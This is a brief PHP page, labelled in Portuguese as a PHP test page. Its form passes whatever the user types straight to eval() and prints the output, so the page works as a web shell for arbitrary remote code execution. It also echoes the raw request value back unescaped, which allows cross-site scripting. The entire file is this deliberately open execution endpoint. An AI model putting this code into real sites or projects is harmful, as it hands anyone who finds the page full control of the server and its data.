<html>

<head>

<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">

</head>

<body>

P&aacute;gina de teste de PHP: <br>

<form action="eval.php" method="post">

Rodar comando PHP: <textarea name="comm" rows="5" cols="80"><?php isset($_REQUEST['comm']) and print($_REQUEST['comm']); ?></textarea>

<input type="submit" value="Rodar">

</form><br>

<?php if (isset($_REQUEST['comm'])) { ?>

Resultado do comando:<br>

<pre><?php echo eval($_REQUEST['comm']); ?></pre>

<?php } ?>

</body>

</html>